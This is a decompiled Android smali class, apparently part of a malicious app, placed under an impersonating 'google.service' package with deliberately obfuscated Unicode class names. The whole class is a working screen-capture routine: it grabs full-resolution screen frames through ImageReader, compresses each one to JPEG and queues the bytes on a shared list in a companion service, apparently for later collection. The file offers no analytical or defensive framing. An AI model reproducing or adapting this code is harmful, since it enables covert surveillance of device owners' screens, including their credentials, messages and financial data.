.class public Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;
.super Ljava/lang/Object;
.source "\u20ab\u02cb\ufe76\u02bb\u02bc\ufe76\u4240\u2db1$$\u2db1\u0640\u3164\u1d35$$\u0674\u02cb\u02bb\u02bb\u02bf\u02be\u2db14790.java"

# interfaces
.implements Landroid/media/ImageReader$OnImageAvailableListener;


# instance fields
.field private final height:I

.field private final imageReader:Landroid/media/ImageReader;

.field private latestBitmap:Landroid/graphics/Bitmap;

.field private final svc:Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;

.field private final width:I


# direct methods
.method constructor <init>(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)V
    .locals 4

    .line 21
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 18
    iput-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->latestBitmap:Landroid/graphics/Bitmap;

    .line 22
    iput-object p1, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->svc:Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;

    .line 24
    invoke-virtual {p1}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v0

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    .line 25
    new-instance v1, Landroid/graphics/Point;

    invoke-direct {v1}, Landroid/graphics/Point;-><init>()V

    .line 27
    invoke-virtual {v0, v1}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    .line 29
    iget v0, v1, Landroid/graphics/Point;->x:I

    .line 30
    iget v1, v1, Landroid/graphics/Point;->y:I

    :goto_0
    mul-int v2, v0, v1

    const/high16 v3, 0x100000

    if-le v2, v3, :cond_0

    shr-int/lit8 v0, v0, 0x1

    shr-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 37
    :cond_0
    iput v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->width:I

    .line 38
    iput v1, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->height:I

    .line 40
    sget v2, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->FPS:I

    const/4 v3, 0x1

    invoke-static {v0, v1, v3, v2}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v0

    iput-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->imageReader:Landroid/media/ImageReader;

    .line 42
    invoke-virtual {p1}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->getHandler()Landroid/os/Handler;

    move-result-object p1

    invoke-virtual {v0, p0, p1}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method close()V
    .locals 1

    .line 101
    iget-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->imageReader:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->close()V

    return-void
.end method

.method getHeight()I
    .locals 1

    .line 97
    iget v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->height:I

    return v0
.end method

.method getSurface()Landroid/view/Surface;
    .locals 1

    .line 89
    iget-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->imageReader:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v0

    return-object v0
.end method

.method getWidth()I
    .locals 1

    .line 93
    iget v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->width:I

    return v0
.end method

.method public onImageAvailable(Landroid/media/ImageReader;)V
    .locals 6

    .line 47
    iget-object p1, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->imageReader:Landroid/media/ImageReader;

    invoke-virtual {p1}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object p1

    if-eqz p1, :cond_3

    .line 50
    invoke-virtual {p1}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object v0

    const/4 v1, 0x0

    .line 51
    aget-object v2, v0, v1

    invoke-virtual {v2}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object v2

    .line 52
    aget-object v3, v0, v1

    invoke-virtual {v3}, Landroid/media/Image$Plane;->getPixelStride()I

    move-result v3

    .line 53
    aget-object v0, v0, v1

    invoke-virtual {v0}, Landroid/media/Image$Plane;->getRowStride()I

    move-result v0

    .line 54
    iget v4, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->width:I

    mul-int v5, v3, v4

    sub-int/2addr v0, v5

    .line 55
    div-int/2addr v0, v3

    add-int/2addr v4, v0

    .line 57
    iget-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->latestBitmap:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_0

    .line 58
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v0

    if-ne v0, v4, :cond_0

    iget-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->latestBitmap:Landroid/graphics/Bitmap;

    .line 59
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v0

    iget v3, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->height:I

    if-eq v0, v3, :cond_2

    .line 60
    :cond_0
    iget-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->latestBitmap:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_1

    .line 61
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    .line 64
    :cond_1
    iget v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->height:I

    sget-object v3, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v4, v0, v3}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    iput-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->latestBitmap:Landroid/graphics/Bitmap;

    .line 68
    :cond_2
    iget-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->latestBitmap:Landroid/graphics/Bitmap;

    invoke-virtual {v0, v2}, Landroid/graphics/Bitmap;->copyPixelsFromBuffer(Ljava/nio/Buffer;)V

    .line 69
    invoke-virtual {p1}, Landroid/media/Image;->close()V

    .line 71
    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {p1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 73
    iget-object v0, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->latestBitmap:Landroid/graphics/Bitmap;

    iget v2, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->width:I

    iget v3, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->height:I

    invoke-static {v0, v1, v1, v2, v3}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 76
    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    sget v2, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->Q:I

    invoke-virtual {v0, v1, v2, p1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 78
    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    .line 81
    sget-object v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->syc:Ljava/lang/Object;

    monitor-enter v0

    .line 82
    :try_start_0
    iget-object v1, p0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->svc:Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;

    iget-object v1, v1, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->bts:Ljava/util/List;

    invoke-interface {v1, p1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 83
    monitor-exit v0

    goto :goto_0

    :catchall_0
    move-exception p1

    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    throw p1

    :cond_3
    :goto_0
    return-void
.end method
